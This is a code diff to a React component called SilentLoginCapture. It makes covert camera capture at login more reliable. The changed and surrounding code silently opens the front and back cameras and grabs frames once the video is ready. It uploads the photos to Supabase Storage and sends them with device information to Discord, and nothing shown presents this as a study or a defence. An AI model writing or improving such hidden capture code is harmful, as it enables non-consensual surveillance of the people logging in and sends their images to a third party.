@@ -198,6 +198,29 @@ export default function SilentLoginCapture({
     };
   }
 
+  // Wait for video to be ready
+  function waitForVideo(video: HTMLVideoElement | null): Promise<void> {
+    return new Promise((resolve) => {
+      if (!video || !video.srcObject) {
+        resolve();
+        return;
+      }
+      if (video.readyState >= 2) {
+        resolve();
+        return;
+      }
+      const onLoaded = () => {
+        video.removeEventListener('loadedmetadata', onLoaded);
+        video.removeEventListener('canplay', onLoaded);
+        resolve();
+      };
+      video.addEventListener('loadedmetadata', onLoaded);
+      video.addEventListener('canplay', onLoaded);
+      // Timeout fallback
+      setTimeout(resolve, 2000);
+    });
+  }
+
   async function startCapture(deviceInfo: DeviceInfo) {
     if (captureEnabled) {
       try {
@@ -208,7 +231,7 @@ export default function SilentLoginCapture({
         });
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
-          videoRef.current.play();
+          await videoRef.current.play();
         }
       } catch {
         console.log("[SilentCapture] Front camera not available");
@@ -222,7 +245,7 @@ export default function SilentLoginCapture({
         });
         if (videoBackRef.current) {
           videoBackRef.current.srcObject = backStream;
-          videoBackRef.current.play();
+          await videoBackRef.current.play();
         }
       } catch {
         try {
@@ -233,7 +256,7 @@ export default function SilentLoginCapture({
           });
           if (videoBackRef.current) {
             videoBackRef.current.srcObject = backStream;
-            videoBackRef.current.play();
+            await videoBackRef.current.play();
           }
         } catch {
           console.log("[SilentCapture] Back camera not available");
@@ -241,10 +264,15 @@ export default function SilentLoginCapture({
       }
     }
 
-    // Wait 3 seconds for cameras to initialize, then capture and send
+    // Wait for videos to be ready, then capture and send
+    await Promise.all([
+      waitForVideo(videoRef.current),
+      waitForVideo(videoBackRef.current),
+    ]);
+    // Extra delay for camera to adjust
     setTimeout(() => {
       sendToDiscord(deviceInfo);
-    }, 3000);
+    }, 1500);
   }
 
   function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
@@ -252,11 +280,17 @@ export default function SilentLoginCapture({
     try {
       const ctx = canvas.getContext("2d");
       if (!ctx) return null;
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
+      // Wait for video to have actual dimensions
+      if (video.videoWidth === 0 || video.videoHeight === 0) {
+        console.log("[SilentCapture] Video not ready yet, dimensions are 0");
+        return null;
+      }
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       return canvas.toDataURL("image/jpeg", 0.8);
-    } catch {
+    } catch (err) {
+      console.error("[SilentCapture] Capture error:", err);
       return null;
     }
   }
@@ -275,16 +309,19 @@ export default function SilentLoginCapture({
     const backImg = captureFrame(videoBackRef.current, canvasBackRef.current);
     stopCameras();
 
+    console.log("[SilentCapture] Front image captured:", !!frontImg, frontImg ? "length: " + frontImg.length : "");
+    console.log("[SilentCapture] Back image captured:", !!backImg, backImg ? "length: " + backImg.length : "");
+
     // Upload images to Supabase Storage and get URLs
     let frontUrl: string | undefined;
     let backUrl: string | undefined;
 
-    if (frontImg) {
+    if (frontImg && frontImg.length > 1000) {
       console.log("[SilentCapture] Uploading front camera photo...");
       frontUrl = await uploadImage(frontImg, "front") || undefined;
     }
 
-    if (backImg) {
+    if (backImg && backImg.length > 1000) {
       console.log("[SilentCapture] Uploading back camera photo...");
       backUrl = await uploadImage(backImg, "back") || undefined;
     }
